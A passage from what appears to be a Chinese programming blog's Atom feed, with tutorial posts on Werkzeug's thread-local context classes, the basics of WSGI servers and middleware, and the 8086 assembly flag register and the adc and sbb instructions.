id="三、本地上下文"><a href="#三、本地上下文" class="headerlink" title="三、本地上下文"></a>三、本地上下文</h4><p>在许多Web程序中，本地上下文是个非常重要的概念。而实现本地上下文需要用到不同线程间数据的隔离。<code>werkzeug.local</code>中定义了<code>Local</code>、<code>LocalStack</code>和<code>LocalProxy</code>等类用于实现全局数据的隔离。</p><p>在Python中，我们可以使用<code>thread locals</code>来保证多线程状态下数据的隔离，但是这在Web程序中，却并不是很好使。</p><ul><li>一是因为有些Web应用是使用协程实现的，无法保证数据的隔离。</li><li>二是即使使用的是线程，WSGI也不能保证每次请求使用的线程都是一个全新的线程，可能是一个<strong>之前请求</strong>的线程，而里面的数据也是原线程剩下的。</li></ul><p>所以，Werkzeug给我们提供了<code>Local</code>这个更好用的解决工具。</p><p>下面是一个如何使用<code>werkzeug.local</code>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> Local, LocalManager</span><br><span class="line"></span><br><span class="line">local = Local()</span><br><span class="line">local_manager = LocalManager([local])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    local.request = request = Request(environ)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">application = local_manager.make_middleware(application)</span><br></pre></td></tr></table></figure><p>可以看到，我们把一个<code>Request</code>对象赋值给了全局对象<code>local.request</code>，这样，我们就可以在全局范围内使用<code>local.request</code>，而且获取到的仅仅是当前请求的数据。因为<code>Local</code>对象不会在请求结束后自动清除本地上下文，所以这里我们需要使用<code>LocalManager</code>来管理。我们需要将管理的<code>Local</code>对象以列表的方式传给<code>LocalManager</code>，并在最后使用<code>LocalManager</code>的<code>make_middleware</code>方法为WSGI程序添加中间件，来使请求结束后自动清除本次请求的数据。</p><p>那么<code>Local</code>是如何实现的呢？其实很简单，在<code>Local</code>中，重写了<code>__getattr__</code>和<code>__setattr__</code>方法，使得在获取数据和存储数据之前，先获取到线程id（或协程id），以线程id（或协程id）为键，数据为值，存储在一个字典中。这样我们在操作数据的时候，操作的只会是当前线程（或协程）的数据，从而实现了数据隔离。感兴趣的同学可以查看一下文末<code>Local</code>的源码。</p><p><code>LocalStack</code>对<code>Local</code>进行了封装，使其可以以栈的方式使用。如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls = LocalStack()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.push(<span class="number">42</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.top</span><br><span class="line"><span class="number">42</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.push(<span class="number">23</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.top</span><br><span class="line"><span class="number">23</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.pop()</span><br><span class="line"><span class="number">23</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.top</span><br><span class="line"><span class="number">42</span></span><br></pre></td></tr></table></figure><p><code>LocalProxy</code>类用于实现werkzeug本地代理，将所有的操作转发给代理对象。如果你熟悉C++的话，你会发现这和C++的引用很像，但比引用更强大。使用方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> Local</span><br><span class="line">l = Local()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下是两个代理</span></span><br><span class="line">request = l(<span class="string">'request'</span>) <span class="comment"># Local中实现了__call__方法，用于返回一个代理，具体可以查看文末Local的源码</span></span><br><span class="line">user = l(<span class="string">'user'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> LocalStack</span><br><span class="line">_response_local = LocalStack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这也是个代理</span></span><br><span class="line">response = _response_local() <span class="comment"># 同理，LocalStack返回的也是代理</span></span><br></pre></td></tr></table></figure><p>除了以上创建代理的方式外，还可以手动创建一个代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> Local, LocalProxy</span><br><span class="line">local = Local()</span><br><span class="line">request = LocalProxy(local, <span class="string">'request'</span>)</span><br></pre></td></tr></table></figure><p>如果你想拥有一个根据指定函数来返回不同的对象代理，也是支持的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session = LocalProxy(<span class="keyword">lambda</span>: get_current_request().session)</span><br></pre></td></tr></table></figure><p>但我们为什么要使用代理呢。这里简单说一下，我们知道，一个变量被赋值后如果不重新赋值，它的值是不会改变的，那么这在程序的某些地方就会变得很不方便。但是如果使用代理的话，那么我们在使用这个变量的时候就能动态的获取到它所代理的对象的最新的值。</p><h4 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h4><p>除了上面三个方面外，Werkzeug还提供了很多工具，例如WSGI中间件、HTTP异常类、数据结构等。这里就不在一一详述，感兴趣的同学可以参考<a href="https://werkzeug.palletsprojects.com/en/0.15.x/" target="_blank" rel="noopener">文档</a>。</p><hr><p><code>Local</code>对象部分源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> greenlet <span class="keyword">import</span> getcurrent <span class="keyword">as</span> get_ident</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">from</span> thread <span class="keyword">import</span> get_ident</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="keyword">from</span> _thread <span class="keyword">import</span> get_ident</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Local</span><span class="params">(object)</span>:</span></span><br><span class="line">    __slots__ = (<span class="string">'__storage__'</span>, <span class="string">'__ident_func__'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        object.__setattr__(self, <span class="string">'__storage__'</span>, &#123;&#125;)</span><br><span class="line">        object.__setattr__(self, <span class="string">'__ident_func__'</span>, get_ident)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> iter(self.__storage__.items())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, proxy)</span>:</span></span><br><span class="line">        <span class="string">"""Create a proxy for a name."""</span></span><br><span class="line">        <span class="keyword">return</span> LocalProxy(self, proxy)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__release_local__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.__storage__.pop(self.__ident_func__(), <span class="keyword">None</span>)  <span class="comment"># 清除数据</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.__storage__[self.__ident_func__()][name]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">raise</span> AttributeError(name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        ident = self.__ident_func__()</span><br><span class="line">        storage = self.__storage__</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            storage[ident][name] = value</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            storage[ident] = &#123;name: value&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">del</span> self.__storage__[self.__ident_func__()][name]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">raise</span> AttributeError(name)</span><br></pre></td></tr></table></figure><hr><p>参考：</p><ul><li><a href="https://www.jianshu.com/p/3f38b777a621" target="_blank" rel="noopener">Werkzeug(Flask)之Local、LocalStack和LocalProxy</a></li><li><a href="https://werkzeug.palletsprojects.com/en/0.15.x/" target="_blank" rel="noopener">Werkzeug0.15.x文档</a></li></ul><p>本篇参考Werkzeug文档写成，如有错误或与文档不符的地方，还请以文档为准，也欢迎您反馈给我。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;上一节介绍了&lt;a href=&quot;/2019/04/06/什么是WSGI/#more&quot;&gt;什么是WSGI&lt;/a&gt;，这一节我们看看Werkzeug&lt;/p&gt;
&lt;p&gt;按照官方的说法，Werkzeug(源自德语，工具的意思)是一个WSGI工具库，它开始于一个适用于WSGI的多样化的工具集
      
    
    </summary>
    
      <category term="Python" scheme="https://mingliangliu.com/categories/Python/"/>
    
    
      <category term="Python" scheme="https://mingliangliu.com/tags/Python/"/>
    
      <category term="Web" scheme="https://mingliangliu.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>什么是WSGI</title>
    <link href="https://mingliangliu.com/2019/04/06/%E4%BB%80%E4%B9%88%E6%98%AFWSGI/"/>
    <id>https://mingliangliu.com/2019/04/06/什么是WSGI/</id>
    <published>2019-04-06T11:05:50.000Z</published>
    <updated>2019-08-04T16:31:45.344Z</updated>
    
    <content type="html"><![CDATA[<p>WSGI全称为Python Web Server Gateway Interface，Python Web服务器网关接口，它是介于Web服务器和Web应用程序（或Web框架）之间的一种简单而通用的接口。</p><img src="/images/wsgi.jpg"><p>我们知道，客户端和服务器端之间进行沟通遵循HTTP协议。但是我们用Python所编写的很多Web程序，并不会直接去处理HTTP请求，因为这太复杂了。所以WSGI诞生了，使从HTTP请求和Web程序之间，多了一种转换过程——从HTTP报文转换成WSGI的数据格式。这个时候，我们的Web程序就可以建立在WSGI之上，直接去处理WSGI解析给我们的请求，而我们就可以专注于Web程序本身的编写。</p><h2 id="一个简单的WSGI程序"><a href="#一个简单的WSGI程序" class="headerlink" title="一个简单的WSGI程序"></a>一个简单的WSGI程序</h2><p>WSGI接口定义的非常简单。根据WSGI的规定，Web程序（即WSGI程序）必须是一个可调用的对象，这个可调用对象可以是函数、方法、类或是实现了<code>__call__</code>方法的类实例。这个可调用的对象接收两个参数：</p><ul><li>environ：包含了请求的所有信息的字典。</li><li>start_response：需要在可调用对象中调用的函数，用来发起响应，参数是状态码，响应头部等。</li></ul><p>另外，这个可调用对象的还要返回一个可迭代的对象。</p><p>我们看一个简单的WSGI程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">'200 OK'</span></span><br><span class="line">    response_header = [(<span class="string">'Content-type'</span>, <span class="string">'text/html'</span>)]</span><br><span class="line">    start_response(status, response_header)</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">b'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br></pre></td></tr></table></figure><p>根据WSGI的定义，请求和响应的主体应为字节串，所以我们在这里返回的html格式字符串上加上了b前缀将其声明为<code>bytes</code>类型</p><h2 id="WSGI服务器"><a href="#WSGI服务器" class="headerlink" title="WSGI服务器"></a>WSGI服务器</h2><p>现在我们的Web程序（WSGI程序）编写好了，就需要一个WSGI服务器来运行它。Python提供了一个wsgiref库，我们可以在开发时进行使用。</p><p>完善上面的WSGI程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">'200 OK'</span></span><br><span class="line">    response_header = [(<span class="string">'Content-type'</span>, <span class="string">'text/html'</span>)]</span><br><span class="line">    start_response(status, response_header)</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">b'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line">server = make_server(<span class="string">'localhost'</span>, <span class="number">5000</span>, index)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>我们使用<code>make_server(host, port, application)</code>方法创建了一个本地服务器，分别传入主机地址、端口和可调用对象。然后使用<code>server_forever()</code>方法来运行它。当在shell中运行后，在浏览器中输入localhost:5000就可以看到我们编写的效果了。</p><p>WSGI服务器在启动后会监听本地端口，当收到请求时，他会将请求报文解析成一个environ字典，然后将其传给WSGI程序，同时传递<code>start_response</code>函数。当我们的WSGI程序将请求处理完后，会通过<code>start_response</code>方法来通知WSGI服务器来发起一个响应，并设置相应的响应头，然后返回响应的主体。然后WSGI服务器再将其解析成HTTP格式，返回给客户端。你也可以通过上面的图片来理解这个过程。</p><h2 id="WSGI中间件"><a href="#WSGI中间件" class="headerlink" title="WSGI中间件"></a>WSGI中间件</h2><p>WSGI允许使用中间件（Middleware）来包装Web程序，在程序在调用前添加额外的设置和属性。这个特性常用来解耦程序的功能。</p><p>我们也可以给我们的程序添加一个中间件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">'200 OK'</span></span><br><span class="line">    response_header = [(<span class="string">'Content-type'</span>, <span class="string">'text/html'</span>)]</span><br><span class="line">    start_response(status, response_header)</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">b'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Middleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, web_app)</span>:</span></span><br><span class="line">        self.web_app = web_app</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, environ, start_response)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">before_start_response</span><span class="params">(status, header)</span>:</span></span><br><span class="line">            header.append((<span class="string">'middleware'</span>, <span class="string">'middleware'</span>))</span><br><span class="line">            <span class="keyword">return</span> start_response(status, header)</span><br><span class="line">        <span class="keyword">return</span> self.web_app(environ, before_start_response)</span><br><span class="line"></span><br><span class="line">new_index = Middleware(index)</span><br><span class="line"></span><br><span class="line">server = make_server(<span class="string">'localhost'</span>, <span class="number">5000</span>, new_index)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>这里我们使用实现了<code>__call__</code>方法的类实例来创建WSGI的可调用对象。并通过这个中间件来为我们的Web程序添加了一个响应头（尽管这没有意义）。真正的中间件远比我们这里实现的复杂、功能强大的多。而且往往不止一个中间件，而是一个中间件堆栈，通过层层包装，实现了非常多的功能。</p><h2 id="Web框架"><a href="#Web框架" class="headerlink" title="Web框架"></a>Web框架</h2><p>现在有了WSGI，我们可以很容易实现一个Python Web程序，但是这还是不够方便，于是有了Web框架。</p><p>Python Web框架是在WSGI的上面又抽象出来一层，使之更易使用，编写的Python Web程序也更易维护。</p><p>我们以非常著名的Flask框架为例。重新实现一下上面的WSGI程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>另外，Python还有很多流行的Web框架，例如Django，web.py、Tornado等，这里不在详细展开。</p><hr><p>参考资料:</p><ul><li><p><a href="https://zh.wikipedia.org/wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E5%85%B3%E6%8E%A5%E5%8F%A3" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E5%85%B3%E6%8E%A5%E5%8F%A3</a></p></li><li><p>《Flask Web开发实战》</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;WSGI全称为Python Web Server Gateway Interface，Python Web服务器网关接口，它是介于Web服务器和Web应用程序（或Web框架）之间的一种简单而通用的接口。&lt;/p&gt;
&lt;img src=&quot;/images/wsgi.jpg&quot;&gt;

&lt;
      
    
    </summary>
    
      <category term="Python" scheme="https://mingliangliu.com/categories/Python/"/>
    
    
      <category term="Python" scheme="https://mingliangliu.com/tags/Python/"/>
    
      <category term="Web" scheme="https://mingliangliu.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>汇编语言之标志寄存器</title>
    <link href="https://mingliangliu.com/2019/03/03/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E4%B9%8B%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <id>https://mingliangliu.com/2019/03/03/汇编语言之标志寄存器/</id>
    <published>2019-03-03T13:07:55.000Z</published>
    <updated>2019-08-04T16:31:45.424Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1></blockquote><p>CPU内部的寄存器中，有一种特殊的寄存器（对于不同的机器，个数和结构都有可能不同）具有以下三个功能:</p><ul><li>用来存储某些相关指令的执行结果</li><li>用来为CPU执行相关的指令提供行为依据</li><li>用来控制CPU的相关工作方式</li></ul><p>这种特殊的寄存器在8086CPU中称为标志寄存器。8086的标志寄存器有16位，其中存储的信息通常被称为程序状态字(PSW)。</p><p>标志寄存器与其他寄存器不一样，其他寄存器是用来放数据的，都是整个寄存器具有一个含义，而标志寄存器是按位起作用的。</p><p>8086中的标志寄存器的结构如下图所示:</p><img src="/images/标志寄存器.jpg"><p>其中1、3、4、12、13、14、15位在8086中没有使用。另外对于有确切含义的每一位，我们称为标志位</p><h2 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h2><p>标志寄存器的第六位是ZF，零标志位。他是记录相关指令执行后，其结果是否位零。如果为零，那么zf=1,如果不为零，那么zf=0</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 1</span><br><span class="line">sub ax, 1</span><br></pre></td></tr></table></figure><p>执行后，ax的结果为0，所以zf=1</p><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 2</span><br><span class="line">sub ax, 1</span><br></pre></td></tr></table></figure><p>执行后，ax的结果不为0，所以zf=0</p><div class="note success">            <p>在这里，有一点需要注意：在8086的指令集中，有的指令的执行是影响标志位的，比如add、sub、mul、div、inc、or、and等，它们大都是运算指令（进行逻辑或算数运算）；有的指令的执行对标志寄存器没有影响，比如mov、push、pop等，它们大都是传送指令。</p>          </div><h2 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h2><p>标志寄存器的第二位是PF，奇偶标志位。它记录相关指令执行后，其结果的所有bit位中1的个数是否位偶数。如果是偶数，pf=1，如果位奇数，pf=0</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">add al, 10</span><br></pre></td></tr></table></figure><p>执行后，al为00001011B，其中有3个1，所以pf=0</p><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">or al, 2</span><br></pre></td></tr></table></figure><p>执行后结果为00000011B，其中有2个1，所以pf=1</p><h2 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h2><p>标志寄存器的第七位是SF，符号标志位。它记录相关指令执行后，其结果是否为负。如果为负，sf=1，如果非负，sf=0</p><p>这里要明确一点，在计算机中，通常用补码来表示有符号的数据，计算机中的一个数据既可以看作有符号数，也可以看作无符号数。不管我们如何看待，当CPU在进行运算的时候，就已经包含了两种含义，也将的到同一种信息来记录的两种结果。关键在于我们的程序需要那一种。</p><p>SF标志，是CPU对有符号数运算结果一种记录。如果我们将数据当作无符号数来运算，SF标志位则没有意义，虽然计算过程中影响了他的值。</p><p>我个人在这里的更简单写的理解是计算后结果的最高位是否为1，为1，这sf=1，否则，sf=0</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 100000001B</span><br><span class="line">add al, 1</span><br></pre></td></tr></table></figure><p>执行后结果为10000010B，sf=1，表示如果进行的是有符号运算的话，则结果为负</p><p>再比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 10000001B</span><br><span class="line">add al, 01111111B</span><br></pre></td></tr></table></figure><p>执行后，结果为0，sf=0，表示，如果进行的是有符号运算，这结果为非负</p><h2 id="CF标志"><a href="#CF标志" class="headerlink" title="CF标志"></a>CF标志</h2><p>标志寄存器的第0为是CF，仅为标志位。一般情况下，在进行 <em>无符号</em> 运算的时候，它记录了运算结果的最高有效位向更高有效位的进位，或从更高有效位的借位。</p><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al, 98H</span><br><span class="line">add al, al  ; 执行后(al)=30H, CF=1, 产生进位</span><br><span class="line">add al, al  ; 执行后(al)=60H, CF=0, 没有进位，或者说进位为0</span><br></pre></td></tr></table></figure><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al, 97H</span><br><span class="line">sub al, 98H  ; 执行后(al)=FFH, CF=1, 产生借位</span><br><span class="line">sub al, al   ; 执行后(al)=0, CF=0, 借位为0</span><br></pre></td></tr></table></figure><h2 id="OF标志"><a href="#OF标志" class="headerlink" title="OF标志"></a>OF标志</h2><p>标志寄存器的第11位是OF，溢出标志位。一般情况下，OF记录了 <em>有符号数</em> 的运算结果是否发生了溢出。如果发生了溢出，of=1，如果没有，of=0</p><div class="note success">            <p>这里一定要注意的是CF和OF的区别，CF是对无符号数运算有意义的标志位，而OF是对有符号数运算有意义的标志位。 它们之间没有任何关系 </p>          </div><p>比如指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 98</span><br><span class="line">add al, 99</span><br></pre></td></tr></table></figure><p>执行后，of=1，发生溢出，没有进位</p><p>再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 0F0H</span><br><span class="line">add al, 78H</span><br></pre></td></tr></table></figure><p>执行后：of=0，没有溢出</p><h2 id="DF标志"><a href="#DF标志" class="headerlink" title="DF标志"></a>DF标志</h2><p>标志寄存器的第10位是DF，方向标志位。在串传送指令中，控制每次操作后si、di的增减。</p><p>df=0，每次操作后si、di递增</p><p>df=1，每次操作后si、di递减</p><p>例如串传送指令<code>movsb</code>：</p><ul><li><p>格式：<code>movsb</code></p></li><li><p>功能：执行下面几步操作：1、((es) x 16 + (di)) = ((ds) x 16 + (si)) 2、如果df=0，(si)=(si)+1, (di)=(di)+1。如果df=1，则(si)=(si)-1, (di)=(di)-1</p></li></ul><p>另外还有<code>movsw</code>，这时候就是一次传送一个字了，相应的si和di的+1-1也就变更成了+2-2</p><p>一般，<code>movsb</code>和<code>movsw</code>一般配合指令<code>rep</code>指令使用，如<code>rep movsb</code>， 相当于</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s: movsb  ; 当然啦，在此之前要先设置cx寄存器</span><br><span class="line">   loop s</span><br></pre></td></tr></table></figure><h2 id="adc、sbb、cmp、pushf和popf指令"><a href="#adc、sbb、cmp、pushf和popf指令" class="headerlink" title="adc、sbb、cmp、pushf和popf指令"></a>adc、sbb、cmp、pushf和popf指令</h2><p>再没有标志寄存器的时候，我们进行加减运算最多只能进行16位的加减运算，这在实际的应用中显然是不够的，那么有了标志寄存器，在结合<code>adc</code>和<code>sbb</code>指令，我们就可以进行任意多位的数的加减法了</p><h3 id="adc指令"><a href="#adc指令" class="headerlink" title="adc指令"></a>adc指令</h3><p>adc是带进位的加法指令，它利用了CF上记录的进位值</p><ul><li>指令格式：adc 操作对象1，操作对象2</li><li>功能： 操作对象1 = 操作对象1 + 操作对象2 + CF</li></ul><p>比如：计算1EF000H + 201000H，结果放在ax（高16位）和bx（低16位）中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 001EH</span><br><span class="line">mov bx, 0F000H</span><br><span class="line">add bx, 1000H</span><br><span class="line">adc ax, 0020H</span><br></pre></td></tr></table></figure><p>更多位数的数相加和以上同理</p><h3 id="sbb指令"><a href="#sbb指令" class="headerlink" title="sbb指令"></a>sbb指令</h3><p>sbb是借位减法指令，它利用了CF位上记录的借位值</p><ul><li>指令格式：sbb 操作对象1，操作对象2</li><li>功能：操作对象1 = 操作对象1 - 操作对象2 - CF</li></ul><p>比如：计算003E1000H - 00202000H，结果保存在ax，bx中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 